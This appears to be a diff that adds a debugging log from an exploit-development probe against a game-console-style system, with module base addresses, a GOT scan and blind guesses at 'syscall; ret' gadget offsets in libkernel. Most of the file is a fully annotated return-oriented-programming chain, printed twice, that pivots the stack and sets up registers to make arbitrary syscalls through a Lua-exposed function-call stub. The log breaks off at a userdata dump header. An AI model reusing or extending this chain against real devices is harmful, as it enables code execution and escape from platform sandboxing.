@@ -1,0 +1,250 @@
+=== PROBE 41v: EBOOT GOT DUMP ===
+
+eboot text: 0x06B290000 sz=0x494000
+eboot data: 0x06BA90000 sz=0x180000
+
+modules: 39
+libkernel: 0x8283C0000 sz=0x48000
+
+--- PART 1: GOT SCAN ---
+total GOT entries pointing to module text: 44
+  libc.prx                     1 entries
+  eboot.bin                    43 entries
+
+--- PART 2: LIBKERNEL GOT ENTRIES ---
+(offset from libkernel text base)
+
+
+libkernel entries: 0
+
+--- PART 3: CANDIDATE SYSCALL;RET OFFSETS ---
+
+In FreeBSD, the raw __syscall helper is typically:
+  0F 05 C3  (syscall; ret)
+at a small offset in libkernel text.
+
+known function offsets (sorted):
+
+--- PART 4: CROSS-FUNCTION BOUNDARY CHECK ---
+
+--- PART 5: BLIND CANDIDATES ---
+libkernel base: 0x8283C0000
+
+candidate syscall;ret addresses to try:
+
+raw low offsets:
+  libkernel+0x0000: 0x8283C0000
+  libkernel+0x0004: 0x8283C0004
+  libkernel+0x0008: 0x8283C0008
+  libkernel+0x000C: 0x8283C000C
+  libkernel+0x0010: 0x8283C0010
+  libkernel+0x0014: 0x8283C0014
+  libkernel+0x0018: 0x8283C0018
+  libkernel+0x001C: 0x8283C001C
+  libkernel+0x0020: 0x8283C0020
+
+--- PART 6: LUA SYSCALL OBJECT ---
+syscall.pipe: address @ 0x8283c0b57
+
+ropchain @ 0x3105e60f0 (size: 0x2f0)
+
+fcall_stub.fn_addr: 0x3105e5fd0
+fcall_stub.return_addr: 0x3105e5fe0
+
+0x3105e60f0: 0x6b290042	; ret
+0x3105e60f8: 0x6b290992	; pop rax; ret
+0x3105e6100: 0x3105e4040
+0x3105e6108: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6110: 0x6b359dfe	; pop rdi; ret
+0x3105e6118: 0x3105e5fd0
+0x3105e6120: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6128: 0x6b290992	; pop rax; ret
+0x3105e6130: 0x3105e6348
+0x3105e6138: 0x6b359dfe	; pop rdi; ret
+0x3105e6140: 0x3105e5fe0
+0x3105e6148: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6150: 0x6b290992	; pop rax; ret
+0x3105e6158: 0x3105e40b0
+0x3105e6160: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6168: 0x6b359dfe	; pop rdi; ret
+0x3105e6170: 0x3105e6198
+0x3105e6178: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6180: 0x6b290992	; pop rax; ret
+0x3105e6188: 0x3105e8100
+0x3105e6190: 0x6b3d1fc7	; pop r13; pop r14; pop r15; ret
+0x3105e6198: 0x0
+0x3105e61a0: 0x6b290042	; ret
+0x3105e61a8: 0x6b290042	; ret
+0x3105e61b0: 0x6b3c6970	; mov r9, r13; call [rax + 8]
+0x3105e61b8: 0x6b290992	; pop rax; ret
+0x3105e61c0: 0x6b3c6970	; mov r9, r13; call [rax + 8]
+0x3105e61c8: 0x6b359dfe	; pop rdi; ret
+0x3105e61d0: 0x3105e61b0
+0x3105e61d8: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e61e0: 0x6b290992	; pop rax; ret
+0x3105e61e8: 0x3105e40a0
+0x3105e61f0: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e61f8: 0x6b359dfe	; pop rdi; ret
+0x3105e6200: 0x3105e6218
+0x3105e6208: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6210: 0x6b290991	; pop r8; ret
+0x3105e6218: 0x0
+0x3105e6220: 0x6b290992	; pop rax; ret
+0x3105e6228: 0x3105e4090
+0x3105e6230: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6238: 0x6b359dfe	; pop rdi; ret
+0x3105e6240: 0x3105e6258
+0x3105e6248: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6250: 0x6b290e64	; pop rcx; ret
+0x3105e6258: 0x0
+0x3105e6260: 0x6b290992	; pop rax; ret
+0x3105e6268: 0x3105e4080
+0x3105e6270: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6278: 0x6b359dfe	; pop rdi; ret
+0x3105e6280: 0x3105e6298
+0x3105e6288: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6290: 0x6b6402d7	; pop rdx; ret
+0x3105e6298: 0x0
+0x3105e62a0: 0x6b290992	; pop rax; ret
+0x3105e62a8: 0x3105e4070
+0x3105e62b0: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e62b8: 0x6b359dfe	; pop rdi; ret
+0x3105e62c0: 0x3105e62d8
+0x3105e62c8: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e62d0: 0x6b29d77d	; pop rsi; ret
+0x3105e62d8: 0x0
+0x3105e62e0: 0x6b290992	; pop rax; ret
+0x3105e62e8: 0x3105e4060
+0x3105e62f0: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e62f8: 0x6b359dfe	; pop rdi; ret
+0x3105e6300: 0x3105e6318
+0x3105e6308: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6310: 0x6b359dfe	; pop rdi; ret
+0x3105e6318: 0x3105ea500
+0x3105e6320: 0x6b290992	; pop rax; ret
+0x3105e6328: 0x3105e4050
+0x3105e6330: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6338: 0x6b2909a2	; pop rsp; ret
+0x3105e6340: 0x3105e5fd0
+0x3105e6348: 0x6b359dfe	; pop rdi; ret
+0x3105e6350: 0x3105e8120
+0x3105e6358: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6360: 0x6b290992	; pop rax; ret
+0x3105e6368: 0x1d8488070	; longjmp
+0x3105e6370: 0x6b359dfe	; pop rdi; ret
+0x3105e6378: 0x3105e5fd0
+0x3105e6380: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6388: 0x6b290992	; pop rax; ret
+0x3105e6390: 0x3105e63e0
+0x3105e6398: 0x6b359dfe	; pop rdi; ret
+0x3105e63a0: 0x3105e5fe0
+0x3105e63a8: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e63b0: 0x6b359dfe	; pop rdi; ret
+0x3105e63b8: 0x3105e8130
+0x3105e63c0: 0x6b29d77d	; pop rsi; ret
+0x3105e63c8: 0x0
+0x3105e63d0: 0x6b2909a2	; pop rsp; ret
+0x3105e63d8: 0x3105e5fd0
+test syscall(20): address @ 0x8283c0b57
+
+ropchain @ 0x3105e60f0 (size: 0x2f0)
+
+fcall_stub.fn_addr: 0x3105e5fd0
+fcall_stub.return_addr: 0x3105e5fe0
+
+0x3105e60f0: 0x6b290042	; ret
+0x3105e60f8: 0x6b290992	; pop rax; ret
+0x3105e6100: 0x3105e4040
+0x3105e6108: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6110: 0x6b359dfe	; pop rdi; ret
+0x3105e6118: 0x3105e5fd0
+0x3105e6120: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6128: 0x6b290992	; pop rax; ret
+0x3105e6130: 0x3105e6348
+0x3105e6138: 0x6b359dfe	; pop rdi; ret
+0x3105e6140: 0x3105e5fe0
+0x3105e6148: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6150: 0x6b290992	; pop rax; ret
+0x3105e6158: 0x3105e40b0
+0x3105e6160: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6168: 0x6b359dfe	; pop rdi; ret
+0x3105e6170: 0x3105e6198
+0x3105e6178: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6180: 0x6b290992	; pop rax; ret
+0x3105e6188: 0x3105e8100
+0x3105e6190: 0x6b3d1fc7	; pop r13; pop r14; pop r15; ret
+0x3105e6198: 0x0
+0x3105e61a0: 0x6b290042	; ret
+0x3105e61a8: 0x6b290042	; ret
+0x3105e61b0: 0x6b3c6970	; mov r9, r13; call [rax + 8]
+0x3105e61b8: 0x6b290992	; pop rax; ret
+0x3105e61c0: 0x6b3c6970	; mov r9, r13; call [rax + 8]
+0x3105e61c8: 0x6b359dfe	; pop rdi; ret
+0x3105e61d0: 0x3105e61b0
+0x3105e61d8: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e61e0: 0x6b290992	; pop rax; ret
+0x3105e61e8: 0x3105e40a0
+0x3105e61f0: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e61f8: 0x6b359dfe	; pop rdi; ret
+0x3105e6200: 0x3105e6218
+0x3105e6208: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6210: 0x6b290991	; pop r8; ret
+0x3105e6218: 0x0
+0x3105e6220: 0x6b290992	; pop rax; ret
+0x3105e6228: 0x3105e4090
+0x3105e6230: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6238: 0x6b359dfe	; pop rdi; ret
+0x3105e6240: 0x3105e6258
+0x3105e6248: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6250: 0x6b290e64	; pop rcx; ret
+0x3105e6258: 0x0
+0x3105e6260: 0x6b290992	; pop rax; ret
+0x3105e6268: 0x3105e4080
+0x3105e6270: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6278: 0x6b359dfe	; pop rdi; ret
+0x3105e6280: 0x3105e6298
+0x3105e6288: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6290: 0x6b6402d7	; pop rdx; ret
+0x3105e6298: 0x0
+0x3105e62a0: 0x6b290992	; pop rax; ret
+0x3105e62a8: 0x3105e4070
+0x3105e62b0: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e62b8: 0x6b359dfe	; pop rdi; ret
+0x3105e62c0: 0x3105e62d8
+0x3105e62c8: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e62d0: 0x6b29d77d	; pop rsi; ret
+0x3105e62d8: 0x0
+0x3105e62e0: 0x6b290992	; pop rax; ret
+0x3105e62e8: 0x3105e4060
+0x3105e62f0: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e62f8: 0x6b359dfe	; pop rdi; ret
+0x3105e6300: 0x3105e6318
+0x3105e6308: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6310: 0x6b359dfe	; pop rdi; ret
+0x3105e6318: 0x3105ea500
+0x3105e6320: 0x6b290992	; pop rax; ret
+0x3105e6328: 0x3105e4050
+0x3105e6330: 0x6b2aeebb	; mov rax, [rax]; ret
+0x3105e6338: 0x6b2909a2	; pop rsp; ret
+0x3105e6340: 0x3105e5fd0
+0x3105e6348: 0x6b359dfe	; pop rdi; ret
+0x3105e6350: 0x3105e8120
+0x3105e6358: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6360: 0x6b290992	; pop rax; ret
+0x3105e6368: 0x1d8488070	; longjmp
+0x3105e6370: 0x6b359dfe	; pop rdi; ret
+0x3105e6378: 0x3105e5fd0
+0x3105e6380: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e6388: 0x6b290992	; pop rax; ret
+0x3105e6390: 0x3105e63e0
+0x3105e6398: 0x6b359dfe	; pop rdi; ret
+0x3105e63a0: 0x3105e5fe0
+0x3105e63a8: 0x6b322c67	; mov [rdi], rax; ret
+0x3105e63b0: 0x6b359dfe	; pop rdi; ret
+0x3105e63b8: 0x3105e8130
+0x3105e63c0: 0x6b29d77d	; pop rsi; ret
+0x3105e63c8: 0x0
+0x3105e63d0: 0x6b2909a2	; pop rsp; ret
+0x3105e63d8: 0x3105e5fd0
+pipe userdata at: 0x8283c0b57
+userdata dump (16 qwords):
